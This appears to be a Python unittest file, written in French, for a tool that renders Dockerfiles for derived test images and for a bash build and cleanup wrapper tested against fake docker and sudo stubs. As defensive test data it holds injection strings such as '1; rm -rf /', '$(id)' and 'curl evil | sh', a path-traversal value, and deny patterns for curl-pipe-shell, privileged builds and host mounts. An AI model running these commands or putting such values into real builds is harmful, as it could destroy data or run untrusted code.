"""Images dérivées des tests au serveur (conception § 5.12, tâche 14c) : rendu du Dockerfile (fonction pure), étiquette, registre,
et enveloppe hôte `taches/construire_image_tests.sh` (bash du poste, faux `sudo`/`docker`/`df`, rien n'est construit)."""
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from datetime import datetime
from pathlib import Path

RACINE = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(RACINE / "outils"))
sys.path.insert(0, str(RACINE))

import tests_images  # noqa: E402
from tests_profil import Profil  # noqa: E402

SERVEUR_OVH = RACINE / "serveur_ovh"
SCRIPT = SERVEUR_OVH / "taches" / "construire_image_tests.sh"
DOCKERFILE_TESTS = SERVEUR_OVH / "images" / "tests" / "Dockerfile"

COMPLET = {"jdk": "11", "node": "18.20.4", "python": "3.11", "maven": "3.9.9", "dotnet": "8.0", "go": "1.23",
           "rust": "1.82.0", "godot": "4.7", "gradle": "9.3.1"}
DIGEST_UNITY = "sha256:" + "c" * 64
MALVEILLANTES = ["1; rm -rf /", "1\nRUN id", "$(id)", "`id`", "1 && curl evil | sh", "1'", '1"', "", " 1", "1 ", "1\n", "..", "1/2",
                 "latest", "18.x", "v18", "١٨"]


def profil(**outils):
    return Profil(familles=("python",), outils=dict(outils))


def instructions(texte):
    """Les instructions du Dockerfile, continuations jointes, commentaires et lignes vides ôtés."""
    return [x for x in re.sub(r"\\\n", " ", texte).splitlines() if x.strip() and not x.lstrip().startswith("#")]


class TestRendu(unittest.TestCase):
    def test_table_fermee(self):
        self.assertEqual(set(tests_images.OUTILS), {"jdk", "node", "python", "maven", "dotnet", "go", "rust", "godot", "unity"})
        self.assertEqual(set(tests_images.MOTIFS_VERSION), set(tests_images.OUTILS))

    def test_rendu_reproductible(self):
        t1, s1 = tests_images.rendre_dockerfile(profil(**COMPLET))
        t2, s2 = tests_images.rendre_dockerfile(profil(**dict(reversed(list(COMPLET.items())))))   # l'ordre du profil n'y change rien
        self.assertEqual((t1, s1), (t2, s2))
        self.assertEqual(s1, __import__("hashlib").sha256(t1.encode("utf-8")).hexdigest())
        self.assertTrue(t1.startswith("# Image derivee") and t1.endswith("\n") and "\r" not in t1)
        ordre = [t1.index(x) for x in ("openjdk-11", "nodejs.org", "python-build-standalone", "apache-maven", "dotnet-", "go.dev",
                                         "rustup-init", "godot-builds")]
        self.assertEqual(ordre, sorted(ordre))                                                       # blocs dans un ordre fixe
        self.assertTrue(t1.startswith("# Image derivee des campagnes de tests") and "\nFROM myiafactory/tests\n" in t1)
        self.assertIn("\nFROM myiafactory/tests@sha256:" + "a" * 64 + "\n", tests_images.rendre_dockerfile(profil(jdk="11"), "sha256:" + "a" * 64)[0])

    def test_base_deja_fournie_sans_bloc(self):
        texte, _ = tests_images.rendre_dockerfile(profil(node="22.4.0", python="3.12", jdk="17", gradle="9"))
        self.assertNotIn("nodejs.org", texte)
        self.assertNotIn("python-build-standalone", texte)
        self.assertIn("openjdk-17-jdk-headless", texte)
        texte, _ = tests_images.rendre_dockerfile(profil(node="18"))
        self.assertIn("latest-v18.x/SHASUMS256.txt", texte)
        texte, _ = tests_images.rendre_dockerfile(profil(node="18.20.4"))
        self.assertIn("https://nodejs.org/dist/v18.20.4/SHASUMS256.txt", texte)

    def test_unity_base_gameci(self):
        p = profil(unity="6000.6.7f1", unity_revision="b22767f04f04", python="3.11")
        with self.assertRaises(ValueError):
            tests_images.rendre_dockerfile(p)                       # tâche 14g : jamais par étiquette seule (aucun tirage)
        texte, _ = tests_images.rendre_dockerfile(p, DIGEST_UNITY)
        self.assertIn(f"\nFROM unityci/editor:ubuntu-6000.6.7f1-android-4.0.0@{DIGEST_UNITY}\n", texte)
        self.assertIn("COPY entree-tests.sh /usr/local/bin/entree-tests.sh", texte)
        self.assertTrue(texte.rstrip().endswith('ENTRYPOINT ["/usr/local/bin/entree-tests.sh"]'))

    def test_rendu_sans_texte_du_projet(self):
        for outil in tests_images.OUTILS:
            for mauvaise in MALVEILLANTES:
                with self.assertRaises(ValueError, msg=f"{outil} {mauvaise!r}"):
                    tests_images.rendre_dockerfile(profil(**{outil: mauvaise}))
        for outil in ("jdk", "node", "go"):                                                           # types qui ne sont pas des textes
            for mauvais in (None, ["11"], {"a": 1}, True, 1.5):
                with self.assertRaises(ValueError):
                    tests_images.rendre_dockerfile(profil(**{outil: mauvais}))
        for outil in ("evil; rm -rf /", "bash", "ruby", "unity\nRUN id"):                              # outil hors de la table
            with self.assertRaises(ValueError):
                tests_images.rendre_dockerfile(profil(**{outil: "1"}))
        with self.assertRaises(ValueError):
            tests_images.rendre_dockerfile(profil(jdk="11"), "sha256:zz; rm")                          # digest hors motif
        with self.assertRaises(ValueError):
            tests_images.rendre_dockerfile(profil(maven="3.9.9"))                                      # maven sans JDK
        # Le texte du projet autre que les versions (commandes, noms, raisons) n'entre jamais dans le rendu.
        p = Profil(familles=("python", "x; rm -rf /"), outils={"jdk": "11"}, commandes=[["curl", "http://evil", "|", "sh"]],
                   caches=["../../etc"], raisons=("evil-raison",), non_deportable="evil-non")
        texte, _ = tests_images.rendre_dockerfile(p)
        for interdit in ("evil", "x; rm", "../../etc"):
            self.assertNotIn(interdit, texte)
        # Rendu complet : que de l'ASCII imprimable ; chaque valeur dans une ligne RUN reste dans [0-9A-Za-z.+_-].
        texte, _ = tests_images.rendre_dockerfile(profil(**COMPLET))
        self.assertTrue(all(c == "\n" or 32 <= ord(c) < 127 for c in texte))
        for valeur in COMPLET.values():
            self.assertRegex(valeur, r"^[0-9A-Za-z.+_-]+$")

    def test_aucun_curl_pipe_shell(self):
        for outils, digest in ((COMPLET, None), ({"unity": "6000.6.7f1", "node": "18"}, DIGEST_UNITY)):
            texte, _ = tests_images.rendre_dockerfile(profil(**outils), digest)
            self.assertNotRegex(texte, r"\|\s*(ba|da|z)?sh\b")
            for interdit in ("| sh", "| bash", "nvm", "sdkman", "pyenv", "ADD http", "--privileged", "--mount"):
                self.assertNotIn(interdit, texte)
            self.assertNotRegex(texte, r"(?mi)^\s*(ADD|VOLUME|ONBUILD)\b")
            self.assertEqual(len(re.findall(r"(?m)^FROM ", texte)), 1)

    def test_chaque_telechargement_verifie(self):
        texte, _ = tests_images.rendre_dockerfile(profil(**COMPLET))
        telechargeurs = [i for i in instructions(texte) if re.search(r"\bcurl\b", i) and i.startswith("RUN ")]
        self.assertEqual(len(telechargeurs), 7)                                                       # tous sauf le JDK (paquet signé)
        for run in telechargeurs:
            appels = [m for m in re.finditer(r"\bcurl\s[^&;]*", run) if "install" not in m.group(0).split()[:1]]
            appels = [m for m in appels if " -o " in m.group(0) or " -fsSL -o" in m.group(0)]
            self.assertTrue(appels, run)
            dernier = max(m.end() for m in appels)
            self.assertRegex(run[dernier:], r"\bsha(256|512)sum -c\b", run)                           # somme vérifiée APRÈS le dernier curl
            self.assertNotRegex(run, r"curl [^&;]*(?<!\S)-O\b")                                       # jamais d'écriture hors -o
            for extraction in ("tar -x", "unzip -q"):
                if extraction in run:
                    self.assertLess(run.index("sum -c"), run.index(extraction), run)                  # vérifié avant extraction
            self.assertIn("apt-get purge -y curl", run)                                               # curl purgé dans la même couche
        self.assertEqual(len(re.findall(r"curl -fsSL -o", texte)), len(re.findall(r"\bcurl -", texte)))
        self.assertEqual(len(re.findall(r"set -", texte)), 0)
        self.assertIn('SHELL ["/bin/bash", "-euo", "pipefail", "-c"]', texte)                        # échec d'une étape = échec de la construction

    def test_etiquette_stable(self):
        a = Profil(familles=("node",), outils={"node": "18"}, deps={"verrou": "aaa"}, empreinte="x")
        b = Profil(familles=("node",), outils={"node": "18"}, deps={"verrou": "bbb"}, empreinte="y", commandes=[["npm", "test"]])
        c = Profil(familles=("node",), outils={"node": "20"})
        self.assertEqual(tests_images.etiquette_derivee(a), tests_images.etiquette_derivee(b))
        self.assertNotEqual(tests_images.etiquette_derivee(a), tests_images.etiquette_derivee(c))
        self.assertRegex(tests_images.etiquette_derivee(a), r"^myiafactory/tests-[0-9a-f]{12}$")
        self.assertRegex(tests_images.etiquette_derivee(a), tests_images.MOTIF_IMAGE.pattern + "$")
        from tests_profil import empreinte_image
        attendue = __import__("hashlib").sha256(f"{empreinte_image(a)}:{tests_images.GABARIT_VERSION}".encode()).hexdigest()[:12]
        self.assertEqual(tests_images.etiquette_derivee(a), "myiafactory/tests-" + attendue)       # le gabarit change l'étiquette
        texte, _ = tests_images.rendre_dockerfile(a)
        self.assertIn(f"# gabarit {tests_images.GABARIT_VERSION}\n", texte)                      # ... et la somme du Dockerfile

    def test_decision_et_registre(self):
        d = tests_images.decision_image_derivee(profil(node="18", jdk="11"))
        self.assertEqual(set(d), {"dockerfile", "sha256", "etiquette", "taille_estimee_mo", "duree_estimee_s"})
        self.assertGreater(d["taille_estimee_mo"], 0)
        with tempfile.TemporaryDirectory() as t:
            reg = Path(t) / "sous" / "tests-images.json"
            e, h = "myiafactory/tests-0123456789ab", "f" * 64
            self.assertIsNone(tests_images.image_connue("srv", h, reg))
            tests_images.noter_image("srv", e, h, 812, datetime(2026, 11, 23, 10, 0, 0), reg)
            self.assertEqual(tests_images.image_connue("srv", h, reg), e)
            self.assertIsNone(tests_images.image_connue("autre", h, reg))
            self.assertTrue(tests_images.noter_usage("srv", e, "2026-11-24T08:00:00Z", reg))
            self.assertFalse(tests_images.noter_usage("srv", "myiafactory/tests-ffffffffffff", "2026-11-24T08:00:00Z", reg))
            x = json.loads(reg.read_text(encoding="utf-8"))["srv"][e]
            self.assertEqual((x["empreinte"], x["taille_mo"], x["utilisee_le"]), (h, 812, "2026-11-24T08:00:00Z"))
            self.assertEqual(x["construite_le"], "2026-11-23T10:00:00")
            tests_images.oublier_image("srv", e, reg)
            self.assertIsNone(tests_images.image_connue("srv", h, reg))
            with self.assertRaises(ValueError):
                tests_images.noter_image("srv", "../x", h, 1, "2026-11-24T08:00:00Z", reg)
            reg.write_text("pas du json", encoding="utf-8")                                           # registre abîmé : repart vide
            self.assertIsNone(tests_images.image_connue("srv", h, reg))

    def test_python_patch_refuse_et_pas_de_directive(self):
        for v in ("3.11.9", "3.10.1"):
            with self.assertRaises(ValueError):
                tests_images.rendre_dockerfile(profil(python=v))              # « latest » ne garantit pas un correctif précis
        self.assertIn("3.11", tests_images.rendre_dockerfile(profil(python="3.11"))[0])
        tests_images.rendre_dockerfile(profil(python="3.12.5"))             # fourni par la base : aucun bloc
        texte, _ = tests_images.rendre_dockerfile(profil(**COMPLET))
        self.assertNotRegex(texte, r"(?m)^#\s*[A-Za-z]+\s*=")               # aucune directive d'analyse
        self.assertNotIn("--from=", texte)

    def test_registre_abime_garde(self):
        with tempfile.TemporaryDirectory() as t:
            reg = Path(t) / "tests-images.json"
            reg.write_text("pas du json", encoding="utf-8")
            tests_images.noter_image("srv", "myiafactory/tests-0123456789ab", "f" * 64, 1, "2026-11-24T08:00:00Z", reg)
            self.assertEqual(Path(str(reg) + ".abime").read_text(encoding="utf-8"), "pas du json")
            self.assertEqual(tests_images.image_connue("srv", "f" * 64, reg), "myiafactory/tests-0123456789ab")

    def test_image_tests_sans_curl_pipe(self):
        texte = DOCKERFILE_TESTS.read_text(encoding="utf-8")
        self.assertNotIn("| bash", texte)
        self.assertNotRegex(texte, r"\|\s*(ba)?sh\b")
        self.assertNotIn("nodesource", texte)
        run = next(i for i in instructions(texte) if "SHASUMS256.txt" in i and i.startswith("RUN "))
        self.assertLess(run.rindex("curl -fsSL -o"), run.index("sha256sum -c"))
        self.assertLess(run.index("sha256sum -c"), run.index("tar -xJf"))
        self.assertIn("apt-get purge -y curl", run)


FAUX_DOCKER = r'''#!/bin/sh
echo "docker $*" >> "$MONDE/appels.txt"
nf() { printf %s "$1" | sed 's#/#__#g'; }
resoudre() {
  f="$MONDE/images/$(nf "$1")"; [ -e "$f" ] && { echo "$f"; return 0; }
  for g in "$MONDE"/images/*; do [ -e "$g" ] && [ "$(cat "$g")" = "$1" ] && { echo "$g"; return 0; }; done
  return 1; }
case "$1" in
  build)
    while [ $# -gt 1 ]; do case "$1" in -t) e="$2";; esac; shift; done
    echo "contexte: $(ls -A "$1" | tr '\n' ' ')" >> "$MONDE/appels.txt"
    echo "etape de construction"
    [ "${BUILD_CODE:-0}" = 0 ] && printf '%012x' "$(printf %s "$e" | cksum | cut -d' ' -f1)" > "$MONDE/images/$(nf "$e")"
    exit "${BUILD_CODE:-0}" ;;
  image)
    case "$2" in
      ls) for f in "$MONDE"/images/*; do case "$(basename "$f")" in myiafactory__tests-*|orphelin_*) cat "$f"; echo ;; esac; done; exit 0 ;;
      inspect) for dernier; do :; done
               f=$(resoudre "$dernier") || exit 1
               n=$(basename "$f")
               case "$*" in
                 *Created*) echo "2020-01-01T00:00:00Z" ;;
                 *RepoTags*) case "$n" in orphelin_*) ;; *) printf '%s:latest ' "$(printf %s "$n" | sed 's#__#/#')" ;; esac ;;
                 *) cat "$MONDE/tailles/$n" 2>/dev/null || echo 851443712 ;;
               esac
               exit 0 ;;
    esac ;;
  ps) while read -r v; do [ -n "$v" ] && echo "$v $(cat "$(resoudre "$v")")"; done < "$MONDE/vivantes" 2>/dev/null; exit 0 ;;
  rmi) f=$(resoudre "$2") && rm -f "$f"; exit 0 ;;
esac
exit 0
'''
FAUX_SUDO = 'while case "$1" in -n) true;; *) false;; esac; do shift; done\nexec "$@"'
FAUX_TIMEOUT = 'echo "timeout $*" >> "$MONDE/appels.txt"\nif [ "$1" = -k ]; then shift 2; fi\nshift\nexec "$@"'
FAUX_DF = 'echo "Filesystem 1024-blocks Used Available Capacity Mounted"\necho "x 100000000 1 ${DISQUE_KO:-50000000} 1% /"'


@unittest.skipUnless(shutil.which("bash"), "bash absent")
class TestEnveloppeConstruction(unittest.TestCase):
    def setUp(self):
        t = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, t, True)
        self.monde, self.home, faux = t / "monde", t / "home", t / "bin"
        for d in (self.monde / "images", self.monde / "tailles", self.home, faux):
            d.mkdir(parents=True)
        for nom, corps in (("docker", FAUX_DOCKER), ("sudo", FAUX_SUDO), ("df", FAUX_DF), ("timeout", FAUX_TIMEOUT)):
            (faux / nom).write_text(corps if corps.startswith("#!") else "#!/bin/sh\n" + corps + "\n", newline="\n")
            (faux / nom).chmod(0o755)
        self.env = dict(os.environ, HOME=self.home.as_posix(), MONDE=self.monde.as_posix(),
                        PATH=faux.as_posix() + os.pathsep + os.environ["PATH"], SERVEUR_OVH_DIR=SERVEUR_OVH.as_posix())
        (self.monde / "images" / "myiafactory__tests").write_text("0000000000aa")                  # l'image de base locale existe
        self.profil = profil(node="18", jdk="11")
        self.texte, self.sha = tests_images.rendre_dockerfile(self.profil)
        self.etiquette = tests_images.etiquette_derivee(self.profil)
        self.contexte = self.home / "tests" / ".construction" / self.etiquette
        self.contexte.mkdir(parents=True)
        (self.contexte / "Dockerfile").write_bytes(self.texte.encode("utf-8"))

    def lancer(self, *args, **env):
        return subprocess.run(["bash", SCRIPT.as_posix(), *args], capture_output=True, text=True,
                              env=dict(self.env, **env), timeout=60)

    def appels(self):
        f = self.monde / "appels.txt"
        return f.read_text().splitlines() if f.exists() else []

    def builds(self):
        return [x for x in self.appels() if x.startswith("docker build")]

    def test_construction_refuse_sha_different(self):
        r = self.lancer(self.etiquette, "0" * 64)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertEqual(self.builds(), [])
        self.assertEqual(r.stdout, "")
        self.assertTrue((self.contexte / "Dockerfile").exists())                                      # rien n'est effacé après un refus
        (self.contexte / "Dockerfile").write_bytes(self.texte.encode("utf-8") + b"RUN echo piege\n")  # octets changés après approbation
        self.assertEqual(self.lancer(self.etiquette, self.sha).returncode, 2)
        self.assertEqual(self.builds(), [])
        for etiquette, somme in (("myiafactory/tests", self.sha), ("../x", self.sha), (self.etiquette + "; id", self.sha),
                                 (self.etiquette, self.sha.upper())):
            self.assertEqual(self.lancer(etiquette, somme).returncode, 2, etiquette)
        self.assertEqual(self.builds(), [])

    def test_contexte_sans_fichier_du_projet(self):
        for nom in ("projet.py", ".env", "src"):
            chemin = self.contexte / nom
            chemin.mkdir() if nom == "src" else chemin.write_text("x")
            r = self.lancer(self.etiquette, self.sha)
            self.assertEqual(r.returncode, 2, (nom, r.stderr))
            shutil.rmtree(chemin) if chemin.is_dir() else chemin.unlink()
        lien = self.contexte / "entree-tests.sh"
        try:
            lien.symlink_to(self.home)
        except (OSError, NotImplementedError):
            pass
        else:
            self.assertEqual(self.lancer(self.etiquette, self.sha).returncode, 2)
            lien.unlink()
        self.assertEqual(self.builds(), [])
        r = self.lancer(self.etiquette, self.sha)                                                     # contexte propre : construit
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(len(self.builds()), 1)
        self.assertIn("contexte: Dockerfile entree-tests.sh ", self.appels())                         # le seul Dockerfile + l'entrée du serveur
        self.assertFalse(self.contexte.exists())                                                      # contexte effacé après
        # Le Dockerfile hors gabarit est refusé même avec sa propre somme (ADD, montage, réseau, base inconnue, 2 FROM).
        for ligne in ("ADD http://x/y /y", "RUN --mount=type=bind,source=/etc,target=/e true", "RUN --network=host true",
                      "VOLUME /x", "FROM ubuntu:24.04", "ONBUILD RUN id", "COPY --from=autre /a /b", "# syntax=evil/image",
                      "#escape=`"):
            self.contexte.mkdir(parents=True, exist_ok=True)
            texte = self.texte + ligne + "\n"
            (self.contexte / "Dockerfile").write_bytes(texte.encode())
            sha = __import__("hashlib").sha256(texte.encode()).hexdigest()
            self.assertEqual(self.lancer(self.etiquette, sha).returncode, 2, ligne)
        autre = "FROM ubuntu:24.04\nRUN id\n"
        (self.contexte / "Dockerfile").write_text(autre)
        self.assertEqual(self.lancer(self.etiquette, __import__("hashlib").sha256(autre.encode()).hexdigest()).returncode, 2)
        self.assertEqual(len(self.builds()), 1)

    def test_construction_ligne_image(self):
        r = self.lancer(self.etiquette, self.sha)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stdout, f"#image {self.etiquette} 812\n")
        build = self.builds()[0]
        self.assertRegex(build, rf"^docker build --label myiafactory\.genre=tests-derivee --label myiafactory\.empreinte={self.sha} "
                                rf"-t {self.etiquette} \S+/tests/\.construction/ctx\.[A-Za-z0-9]+$")
        self.assertIn("timeout -k 30 1800 sudo -n docker build", " ".join(self.appels()))
        for interdit in ("--build-arg", "--privileged", "--pull", "-v ", "--mount", "--volume", "--network", "--security", "-f "):
            self.assertNotIn(interdit, build)                                                         # base locale : pas de --pull
        journal = self.home / "tests" / ".construction" / "journaux" / (self.etiquette.split("/")[1] + ".log")
        self.assertIn("etape de construction", journal.read_text())
        self.assertTrue((self.home / "tests" / ".construction" / "usage" / self.etiquette.split("/")[1]).exists())

    def test_base_unity_locale_jamais_tiree(self):
        # Tâche 14g : la base GameCI (27 Go) est celle déjà présente, épinglée par son digest local ; jamais de --pull.
        p = profil(unity="6000.6.7f1")
        texte, sha = tests_images.rendre_dockerfile(p, DIGEST_UNITY)
        self.contexte = self.home / "tests" / ".construction" / tests_images.etiquette_derivee(p)
        self.contexte.mkdir(parents=True)
        (self.contexte / "Dockerfile").write_bytes(texte.encode())
        (self.monde / "images" / "base_unity").write_text(f"unityci/editor:ubuntu-6000.6.7f1-android-4.0.0@{DIGEST_UNITY}")
        r = self.lancer(tests_images.etiquette_derivee(p), sha)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertNotIn("--pull", self.builds()[0])
        self.assertIn("-t myiafactory/tests-unity-6000.6.7f1 -t myiafactory/tests-", self.builds()[0])

    def test_base_locale_absente_refusee(self):
        (self.monde / "images" / "myiafactory__tests").unlink()
        r = self.lancer(self.etiquette, self.sha)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertEqual(self.builds(), [])                                                           # jamais de tirage du Docker Hub
        self.assertIn("docker image inspect myiafactory/tests", " ".join(self.appels()))

    def test_dockerfile_copie_privee_hachee_et_construite(self):
        r = self.lancer(self.etiquette, self.sha)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertNotIn(self.contexte.as_posix(), self.builds()[0])                                  # ce n'est pas le dossier déposé

    def test_disque_et_echec(self):
        r = self.lancer(self.etiquette, self.sha, DISQUE_KO="10485759")
        self.assertEqual(r.returncode, 76, r.stderr)
        self.assertEqual(self.builds(), [])
        r = self.lancer(self.etiquette, self.sha, BUILD_CODE="1")
        self.assertEqual(r.returncode, 1)
        self.assertNotIn("#image", r.stdout)
        self.assertIn("etape de construction", r.stderr)
        self.assertFalse(self.contexte.exists())

    def _image(self, nom, mo, jours, vivante=False):
        etiquette = f"myiafactory/tests-{nom * 12}"
        fichier = etiquette.replace("/", "__")
        (self.monde / "images" / fichier).write_text(nom * 12)
        (self.monde / "tailles" / fichier).write_text(str(mo * 1048576))
        usage = self.home / "tests" / ".construction" / "usage" / etiquette.split("/")[1]
        usage.parent.mkdir(parents=True, exist_ok=True)
        usage.write_text("")
        os.utime(usage, (time.time() - jours * 86400, time.time() - jours * 86400))
        if vivante:
            with open(self.monde / "vivantes", "a") as f:
                f.write(etiquette + "\n")
        return etiquette

    def test_ramassage(self):
        a = self._image("a", 20480, 5)                       # la plus ancienne des non utilisées par un conteneur
        b = self._image("b", 20480, 3)
        c = self._image("c", 20480, 9, vivante=True)         # plus ancienne encore, mais un conteneur la tient
        d = self._image("d", 1024, 1)                        # récente : reste
        (self.monde / "images" / "orphelin_aaaabbbbcccc").write_text("aaaabbbbcccc")   # sans étiquette (reconstruction), sans usage
        (self.monde / "images" / "myiafactory__tests").write_text("0000000000aa")   # image de catalogue : hors label, jamais listée
        r = self.lancer("--ramasser", "40")                  # total 61 Go, budget 40 : a puis b, puis c est tenue, puis d
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stdout.splitlines(), ["#ramassee aaaabbbbcccc", f"#ramassee {a}", f"#ramassee {b}"])   # l'orphelin d'abord
        rmi = [x for x in self.appels() if x.startswith("docker rmi")]
        self.assertEqual(rmi, ["docker rmi aaaabbbbcccc", f"docker rmi {a}", f"docker rmi {b}"])
        self.assertTrue(any("--format {{.ID}}" in x for x in self.appels()))
        self.assertTrue(any("image ls --filter label=myiafactory.genre=tests-derivee" in x for x in self.appels()))
        self.assertTrue((self.monde / "images" / c.replace("/", "__")).exists())
        self.assertTrue((self.monde / "images" / "myiafactory__tests").exists())
        self.assertTrue((self.monde / "images" / d.replace("/", "__")).exists())
        self.assertEqual(self.lancer("--ramasser", "0").returncode, 2)
        self.assertEqual(self.lancer("--ramasser", "x").returncode, 2)

    def test_ramassage_trente_jours_et_usage(self):
        vieille = self._image("a", 100, 40)
        recente = self._image("b", 100, 2)
        r = self.lancer("--ramasser", "30")                  # sous le budget : seule l'image sans usage depuis 30 jours part
        self.assertEqual(r.stdout.splitlines(), [f"#ramassee {vieille}"])
        self.assertTrue((self.monde / "images" / recente.replace("/", "__")).exists())
        reste = self._image("c", 100, 40)
        self.assertEqual(self.lancer("--utilise", reste).returncode, 0)                              # usage noté : plus ancienne
        self.assertEqual(self.lancer("--ramasser", "30").stdout, "")
        self.assertEqual(self.lancer("--utilise", "../x").returncode, 2)


if __name__ == "__main__":
    unittest.main()
